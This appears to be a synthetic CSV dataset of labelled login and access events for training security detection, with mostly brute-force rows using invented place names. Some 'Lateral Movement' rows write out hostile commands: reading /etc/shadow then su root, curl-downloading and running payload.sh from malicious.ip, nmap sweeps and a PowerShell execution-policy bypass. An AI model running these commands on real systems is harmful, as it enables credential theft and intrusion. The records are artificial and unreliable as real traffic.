entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:35,161.42.36.25,"Jasonmouth, Finland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:37,166.216.80.231,"Port Kristimouth, Ghana",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:37,166.216.80.231,"Fowlerstad, Tuvalu",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:37,161.42.36.25,"Lake Linda, United Arab Emirates",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:41,166.216.80.231,"Sarahaven, Brazil",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:43,166.216.80.231,"Emilyland, Heard Island and McDonald Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:47,161.42.36.25,"North Vincent, Argentina",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:50,161.42.36.25,"North Michaeltown, Sao Tome and Principe",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:51,166.216.80.231,"Port Christyton, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:53,161.42.36.25,"North Raymond, Svalbard & Jan Mayen Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:56,161.42.36.25,"East Timothy, Singapore",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:55:57,161.42.36.25,"East Jeremy, Indonesia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:55:59,166.216.80.231,"Linhaven, Dominican Republic",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:05,161.42.36.25,"Hernandezhaven, Puerto Rico",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:11,161.42.36.25,"East Mauricemouth, Tonga",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:12,166.216.80.231,"Leslieborough, Turkey",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:17,166.216.80.231,"Scotthaven, Saint Martin",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:21,161.42.36.25,"Andrewmouth, Haiti",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:22,166.216.80.231,"Port Matthewfort, Greenland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:23,161.42.36.25,"Lake Amandaburgh, Timor-Leste",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:25,161.42.36.25,"Seanland, Albania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:27,166.216.80.231,"Woodwardton, Lebanon",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:29,161.42.36.25,"North Michelle, Puerto Rico",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:32,161.42.36.25,"Smithside, Benin",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:32,166.216.80.231,"Benjamintown, Zimbabwe",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:56:38,161.42.36.25,"Elizabethhaven, Azerbaijan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:42,166.216.80.231,"Johnmouth, Saudi Arabia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:56:59,166.216.80.231,"North Hannah, Peru",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:00,161.42.36.25,"West William, Heard Island and McDonald Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:10,161.42.36.25,"Schmidtburgh, Saint Barthelemy",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:13,161.42.36.25,"Georgeland, Northern Mariana Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:57:17,166.216.80.231,"Bethburgh, Germany",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:20,161.42.36.25,"Mitchellburgh, Guyana",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
68f05bfe-942f-4472-96ec-090865cd5f30,User,2026-06-26 08:57:27,166.216.80.231,"Lake Crystal, Korea",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8b94aaa5-5d97-4657-be4a-4b93f5404b1e,User,2026-06-26 08:57:35,161.42.36.25,"South John, Latvia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 09:59:44,119.181.32.98,"New Eric, Congo",GitLab,SSO,473,N/A,Unknown Browser/Device,True,Impossible Travel
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:05,68.74.121.87,"Dawnside, Guernsey",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:07,68.74.121.87,"Woodwardshire, Martinique",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:09,68.74.121.87,"Dawnhaven, Anguilla",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:11,68.74.121.87,"Floresport, Micronesia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:14,68.74.121.87,"Wongview, Saint Kitts and Nevis",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:17,68.74.121.87,"East Lindsayland, Ukraine",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:21,68.74.121.87,"East Christinaport, Venezuela",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:21,68.74.121.87,"Davisside, Egypt",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:22,68.74.121.87,"Garymouth, Solomon Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:25,68.74.121.87,"Jamesside, Austria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:25,68.74.121.87,"North Tiffany, Algeria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:27,68.74.121.87,"Jessicaton, Heard Island and McDonald Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:30,68.74.121.87,"Jamesbury, Cameroon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:31,68.74.121.87,"Oliverburgh, Cook Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:32,68.74.121.87,"North Erin, Australia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:34,68.74.121.87,"Schneidertown, Bangladesh",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:35,68.74.121.87,"Leeport, Tanzania",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:40,68.74.121.87,"West Holly, Latvia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:44,68.74.121.87,"South Robertland, Marshall Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:47,68.74.121.87,"Elizabethview, Guernsey",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:50,68.74.121.87,"Port Jenny, Cyprus",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:51,68.74.121.87,"North Jennifer, Czech Republic",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:53,68.74.121.87,"New Patrick, Saint Barthelemy",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:47:55,68.74.121.87,"Karenview, Northern Mariana Islands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:02,68.74.121.87,"Shepherdmouth, Suriname",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:13,68.74.121.87,"West Sherry, Netherlands",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:15,68.74.121.87,"New Roger, Afghanistan",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:17,68.74.121.87,"Danielchester, Lebanon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:21,68.74.121.87,"Amandaland, Guinea-Bissau",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:23,68.74.121.87,"East Sarahside, Bangladesh",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:41,68.74.121.87,"Castroport, Antarctica (the territory South of 60 deg S)",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:44,68.74.121.87,"West Vernon, Chad",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:53,68.74.121.87,"South John, Denmark",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:48:55,68.74.121.87,"South Tashamouth, Rwanda",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:13,68.74.121.87,"South Anneberg, Congo",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:20,68.74.121.87,"South Mercedes, Ukraine",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:25,68.74.121.87,"Roblesbury, Rwanda",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:33,68.74.121.87,"West Maria, Belgium",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:49:40,68.74.121.87,"North Coreyview, Luxembourg",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
3fdabf32-b1a1-40e1-a901-d8672958835c,User,2026-06-26 10:50:00,68.74.121.87,"Millerchester, North Macedonia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
ebd78040-c4ca-4c44-897f-7431850907ff,User,2026-06-26 11:30:23,66.35.252.207,"North Dawn, Taiwan",GitLab,Password,529,N/A,BlackArch - Wget - MAC: 5e:5f:28:4d:ce:31,True,Device Spoofing
8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 11:45:46,178.148.47.186,"West Tracymouth, Somalia",VPN,SSO,5460,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 10 - Chrome,True,Lateral Movement
8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 11:49:46,178.148.47.186,"West Tracymouth, Somalia",Intranet,SSO,1874,ping -> ssh admin@10.0.0.5 -> sudo su,Windows 10 - Chrome,True,Lateral Movement
8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:00:46,178.148.47.186,"West Tracymouth, Somalia",Domain Controller,SSO,951,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 10 - Chrome,True,Lateral Movement
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:14,46.41.2.27,"Jameschester, Czech Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:18,46.41.2.27,"Lukebury, Oman",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:18,46.41.2.27,"Melissaland, Falkland Islands (Malvinas)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:20,46.41.2.27,"Penningtonmouth, Samoa",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:28,46.41.2.27,"Adkinsside, Myanmar",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:29,46.41.2.27,"New Andrea, Bermuda",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:30,46.41.2.27,"West Kathyside, India",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:30,46.41.2.27,"South Ianberg, French Polynesia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:31,46.41.2.27,"Andersonshire, United States of America",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:32,46.41.2.27,"Annaview, Niger",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:34,46.41.2.27,"Samuelshire, Ireland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:39,46.41.2.27,"Aprilfurt, Austria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:40,46.41.2.27,"Chavezside, Armenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:44,46.41.2.27,"West Amandaburgh, Ireland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:03:46,178.148.47.186,"West Tracymouth, Somalia",Jira,SSO,2866,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,Windows 10 - Chrome,True,Lateral Movement
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:49,46.41.2.27,"South Melvinview, Tunisia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:50,46.41.2.27,"Huertaport, Afghanistan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:54,46.41.2.27,"Marvinfurt, Lithuania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:03:58,46.41.2.27,"Mariachester, Seychelles",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:00,46.41.2.27,"New Michaelstad, Hungary",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:04,46.41.2.27,"Tammyburgh, Slovenia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:09,46.41.2.27,"Yvonneside, Cameroon",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:11,46.41.2.27,"Port Darryl, Saint Kitts and Nevis",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:14,46.41.2.27,"West Markfort, Saint Helena",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:18,46.41.2.27,"South Kelly, Iceland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:32,46.41.2.27,"East Lee, Liberia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:04:38,46.41.2.27,"Ayalamouth, Austria",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
0a08ea4e-dd0d-4648-a5c9-3733afbe5e02,User,2026-06-26 12:05:03,58.247.212.114,"Nguyenville, Anguilla",Jira,Hardware Token,1273,N/A,Parrot OS - Curl - MAC: c2:e9:2c:1d:31:c2,True,Device Spoofing
51eec865-72e2-490c-8a87-cdeaa86f2009,User,2026-06-26 12:05:14,46.41.2.27,"Mossberg, Syrian Arab Republic",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
51b2cd02-88e6-4f19-bd71-07f0a83881f2,User,2026-06-26 12:07:37,59.128.136.210,"South Jennifer, Greece",Jira,Biometric,6135,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 10 - Chrome,True,Lateral Movement
51b2cd02-88e6-4f19-bd71-07f0a83881f2,User,2026-06-26 12:10:37,59.128.136.210,"South Jennifer, Greece",Backup Server,Biometric,5140,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Windows 10 - Chrome,True,Lateral Movement
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:09,173.28.145.66,"Ryanstad, Angola",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:12,173.28.145.66,"East Michaelport, South Georgia and the South Sandwich Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:14,173.28.145.66,"Madisonton, Suriname",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:19,173.28.145.66,"Christinefurt, Kyrgyz Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:19,173.28.145.66,"New James, Jamaica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"South Stevenmouth, Luxembourg",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"Lake Elizabethchester, Netherlands Antilles",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:21,173.28.145.66,"Mendozaview, Indonesia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:27,173.28.145.66,"Boothshire, Cook Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:28,173.28.145.66,"Ericfort, Luxembourg",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:29,173.28.145.66,"South Derekfurt, French Guiana",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:30,173.28.145.66,"Jessicaville, Grenada",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:30,173.28.145.66,"East Jonathanberg, Malta",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:32,173.28.145.66,"Hernandezchester, Gibraltar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:33,173.28.145.66,"West Debra, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:33,173.28.145.66,"Lake Cody, Angola",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:38,173.28.145.66,"Lake Josemouth, Cambodia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:46,173.28.145.66,"Port Curtisberg, Malaysia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
8dc6619e-6922-42a9-8be1-4d15623a215d,User,2026-06-26 12:17:46,178.148.47.186,"West Tracymouth, Somalia",Backup Server,SSO,4785,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 10 - Chrome,True,Lateral Movement
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:50,173.28.145.66,"Sanchezshire, Costa Rica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:51,173.28.145.66,"South Thomas, Venezuela",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:51,173.28.145.66,"South Jacobville, Timor-Leste",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:52,173.28.145.66,"Jessicamouth, Azerbaijan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:53,173.28.145.66,"New David, Estonia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:53,173.28.145.66,"North Michelle, Nigeria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:17:59,173.28.145.66,"Hubbardland, Lesotho",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:00,173.28.145.66,"New Suzanne, Iceland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:04,173.28.145.66,"Jeffreytown, Ecuador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:11,173.28.145.66,"Taylorshire, Costa Rica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
da814eab-97e2-4948-a2e7-24b7ccbdffef,User,2026-06-26 12:18:13,173.28.145.66,"Garciatown, Benin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
